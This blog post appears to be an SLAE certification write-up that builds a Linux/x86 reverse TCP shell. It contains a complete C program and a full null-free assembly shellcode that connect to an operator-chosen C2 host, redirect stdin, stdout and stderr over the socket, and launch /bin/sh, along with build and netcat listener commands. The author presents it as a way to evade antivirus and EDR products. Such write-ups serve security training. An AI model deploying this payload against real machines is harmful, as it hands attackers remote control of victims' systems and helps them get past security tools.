# SLAE Exam Assignment 2 - Creating a Reverse TCP shellcode

## Prologue
So the second task that we have for our SLAE certification exam is creating a reverse TCP shellcode for Linux/x86 architecture using the knowledge that we have gathered from the wonderful course and the shellcoding techniques that we have accumulated over time.

To be honest this was easily one of my most favourite assignments that I had the pleasure of doing.

Why so? Let me tell you why.

So we create Meterpreter reverse TCP payloads all the time for exploitation purposes right? But invariably what happens is our payload getting caught and detected by AVs and EDRs. But that's all history now.
No more getting caught by AVs and EDRs and next-gen security products because now we can create our very own custom reverse TCP shellcode that is capable of bypassing all of the aforementioned security solutions!
Also there's no ignoring the fact that we hacker tribes get a different joy from using our own custom tools wherever possible in red-teaming engagements/CTFs yada yada yada.

So without any further ado let's get down with it!

## So what is Reverse TCP anyway?
Let's look at a visual representation first and then we'll talk about it.

![Reverse TCP Overview](../assets/images/reverse_tcp_overview.png "Reverse TCP Overview")

We can clearly see from this image that in case of a Reverse TCP shell, the client a.k.a. the victim/target machine beacons out to the server a.k.a. the attacker machine who is listening for connections at a specified port. Now after the server receives a connection, it can then send out commands to the client for it to execute on the victim machine.

Since the direction of connection is reversed from a Bind TCP connection(first post remember?), it is also known as Reverse TCP.

So how is this useful?

Well in certain restricted environments which is almost always the case you will not be able to use a Bind TCP shell to get access because the firewall is going to block the incoming connection request to the victim machine.
But a Reverse TCP shell can be used in those scenarios because the firewall most likely will not block a machine of their own network from making a connection attempt to an outside machine!

So all in all, Reverse TCP shells are very useful in penetration testing and this payload is what we use on almost every occassion with a few exceptions.

## A C Prototype first
If we are going to program in something as low-level as machine code it is only fair that we first create a prototype in a high-level language like C/C++ to conceptualize it and get a template for creating our assembly code right?

```c
// Filename: reverse_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux reverse TCP shell written in C/C++ that inputs
// the C2 address and the port from the console by the operator.
// Usage: ./reverse_tcp 192.168.1.104 8080
// Note: The connection attempt is not tuned so run the listener first.
// Compile with:
// g++ reverse_tcp.cpp -o reverse_tcp
// Testing: nc -lnvp 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_ADDR "192.168.1.104"
//#define C2_PORT 8080 

int main(int argc, char const *argv[])
{
	// Console C2 Address input from operator
	char* C2_ADDR = (char*)argv[1];
	// Console C2 Port input from operator
	char* c2portstring = (char*)argv[2];
	int C2_PORT = atoi(c2portstring);
  	// Declaring a sockaddr_in struct and an int var for socket file descriptor
	struct sockaddr_in client;
	int sockfd;
	// Initializing the sockaddr_in struct
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(C2_ADDR);
	client.sin_port = htons(C2_PORT);
	// 1st Syscall for creating the socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	// 2nd Syscall for connect()
	connect(sockfd, (struct sockaddr *)&client, sizeof(client));
	// 3rd Syscall for dup2()
	dup2(sockfd, 0); // STDIN
	dup2(sockfd, 1); // STDOUT
	dup2(sockfd, 2); // STDERR
	// 4th Syscall for execve()
	execve("/bin/sh", 0, 0);
	return 0;
}
```

And here is a fully-functional C source for a reverse shell payload. Stripping the C code down to it's essential details, we note the following syscalls to be made in our assembly code:

1. socket
1. connect
1. dup2
1. execve

Beautiful! Now let's get started with recreating the payload in ASM.

## Creating the Assembly program
### Clearing registers
The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.

```nasm
; Clearing the first 4 registers for 1st Syscall - socket()
xor eax, eax       ; May also sub OR mul for zeroing out
xor ebx, ebx       ; Clearing out EBX 
xor ecx, ecx       ; Clearing out ECX
cdq                ; Clearing out EDX 
```

Note that we didn't use XOR'ing for clearing the EDX register instead we used `cdq` which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 3 bytes in the process ;)
### Socket syscall
Now we will initiate the socket syscall using the good ol' software interrupt 80h.

```nasm
; Syscall value for socket() = 359 OR 0x167, loading it in AX
mov ax, 0x167
; Loading 2 in BL for AF_INET - 1st argument for socket()
mov bl, 0x02
; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
mov cl, 0x01
; 3rd argument for socket() - 0 is already in EDX register
; Execute the socket() Syscall
int 0x80
; Storing the return value - socket fd in EAX to EBX for later usage
mov ebx, eax
```

Now moving to setup the sockaddr_in struct
### Setting up the sockaddr_in struct for connect syscall
Note from the C prototype that the sockaddr_in struct consists of:

1. The attacker IP address
1. The attacker Port
1. The addressing schema(In this case it's IPv4 so it's value shall be 2)

So let us start by pushing those into the stack. Note that I have configured the C2 a.k.a Command & Control/Attacker IP address and port to be configurable while assembling via nasm with the `-D` flag.

```nasm
; Loading the C2 IP address in stack - sockaddr_in struct - 3rd argument
push dword C2_IP      ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex
; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
push word C2_PORT     ; 0x901f - C2 Port: 8080
; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
push word 0x02
```

Now that we have finished setting up the sockaddr_in struct, let's move on to the connect() syscall.
### Connect syscall
These connect() arguments can be summarized as follows:

1. int sockfd – this is a reference to the socket fd that was created in the first syscall, this is why we moved EAX into EBX
1. struct sockaddr_in client – this is a pointer to the location on the stack of the sockaddr struct that we just created
1. socklen_t clientlen – this is the length of the address the value of which the /usr/include/linux/in.h file tells us is 16

So based on these facts, let's initiate the connect syscall.

```nasm
; connect() Syscall
mov ax, 0x16a ; Syscall for connect() = 362 OR 0x16a, loading it in AX
mov ecx, esp ; Moving sockaddr_in struct from TOS to ECX
mov dl, 16 ; socklen_t addrlen = 16
int 0x80 ; Execute the connect syscall
```

### Setting up the registers for the third syscall - dup2
Now we clear the registers for the next syscall i.e. dup2 and set up a loop variable to 3.
Why? We will come to that in a second.

```nasm
; Clearing out ECX for 3rd Syscall - dup2()
xor ecx, ecx
; Initializing a counter variable = 3 for loop
mov cl, 0x3
```

### Dup2 syscall
Remember from our C prototype that we see the dup2() call is iterating 3 times? Now the counter makes sense right?

This is in order to duplicate into our accepted connection the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive for us the attacker.

So we are going to be using a simple `jnz short` loop to iterate over the dup2 syscall three times.

```nasm
; dup2() Syscall in loop
loop_dup2:
mov al, 0x3f ; dup2() Syscall number = 63 OR 0x3f
dec ecx ; Decrement ECX by 1
int 0x80 ; Execute the dup2 syscall
jnz short loop_dup2 ; Jump back to loop_dup2 label until ZF is set
```

### Execve syscall
At last now that we have created a socket, established a connection and duplicated the file descriptors, now what?

Now we execute `/bin/sh` using Execve-Stack method that we learnt previously to execute commands on the target machine remotely.

```nasm
; execve() Syscall
cdq                    ; Clearing out EDX
push edx               ; push for NULL termination
push dword 0x68732f2f  ; push //sh
push dword 0x6e69622f  ; push /bin
mov ebx, esp           ; store address of TOS - /bin//sh
mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
int 0x80               ; Execute the system call
```

Note that I bastardized the original method to save us some bytes. 

## Full Assembly code
Here is the full assembly code all pieced up together and prettied up.

```nasm
; Filename: reverse_tcp_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux reverse TCP null-free shellcode.
; Usage: ./reverse_tcp_shellcode
; Note: The connection attempt is not tuned so run the listener first. The C2 IP and
; the C2 Port are configurable while assembling with the -D flag(-DC2_IP=0x6801a8c0 -DC2_PORT=0x901f) respectively.
; Compile with:
; ./compile.sh reverse_tcp_shellcode
; Testing: nc -lnvp 8080
; Size of shellcode: 70 bytes


global _start

section .text
_start:

	; Clearing the first 4 registers for 1st Syscall - socket()
	xor eax, eax       ; May also sub OR mul for zeroing out
	xor ebx, ebx       ; Clearing out EBX 
	xor ecx, ecx       ; Clearing out ECX
	cdq                ; Clearing out EDX

	; Syscall for socket() = 359 OR 0x167, loading it in AX
	mov ax, 0x167

	; Loading 2 in BL for AF_INET - 1st argument for socket()
	mov bl, 0x02

	; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
	mov cl, 0x01

	; 3rd argument for socket() - 0 is already in EDX register

	; socket() Syscall
	int 0x80

	; Storing the return value socket fd in EAX to EBX for later usage
	mov ebx, eax

	; Loading the C2 IP address in stack - sockaddr_in struct - 3rd argument
	push dword C2_IP      ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex

	; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
	push word C2_PORT     ; 0x901f - C2 Port: 8080

	; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
	push word 0x02

	; connect() Syscall
	mov ax, 0x16a         ; Syscall for connect() = 362 OR 0x16a, loading it in AX
	mov ecx, esp          ; Moving sockaddr_in struct from TOS to ECX
	mov dl, 16            ; socklen_t addrlen = 16
	int 0x80              ; Execute the connect syscall
  	
	xor ecx, ecx ; Clearing out ECX for 3rd Syscall - dup2()

	mov cl, 0x3 ; Initializing a counter variable = 3 for loop

	; dup2() Syscall in loop
	loop_dup2:
	mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
	dec ecx                ; Decrement ECX by 1
	int 0x80               ; Execute the dup2 syscall
	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set

	; execve() Syscall
	cdq                    ; Clearing out EDX
	push edx               ; push for NULL termination
	push dword 0x68732f2f  ; push //sh
	push dword 0x6e69622f  ; push /bin
	mov ebx, esp           ; store address of TOS - /bin//sh
	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
	int 0x80               ; Execute the system call

```

## A Reverse TCP shellcode generator
Now for the next part of the assignment we have to modify the shellcode so as to make it's C2 IP address and port number configurable.

I have also taken the liberty to create a shellcode generator where the C2 IP and the Port are fed in and it spits out the shellcode in hex string and byte string format. What's more? It also generates the ELF payload just in case we need that and it also looks cool ;)

I have extracted the opcodes from the assembly source using a `converter.py` script I made as a helper script and embedded the hex shellcode string in the generator program without the variable parts - C2 IP and C2 Port to make it configurable at will.

The shellcode generated by our program comes up around 70 bytes in size and completely null-free which I think is not bad considering that the shellcodes from [shell-storm](https://www.shell-storm.org/shellcode/) and [exploit-db](https://www.exploit-db.com/shellcodes/) were of varying sizes but mostly all greater than 70 bytes and the main purpose of a writing a shellcode for exploitation purposes is making it as small as possible.

Here is a working demo of the shellcode generator since the code is too long to include in this blog post itself(All links to codes referred to in this post will be available down below):

<script id="asciicast-Rw3QK6JoGw0Z69jPtz3jjeZGb" src="https://asciinema.org/a/Rw3QK6JoGw0Z69jPtz3jjeZGb.js" async></script>
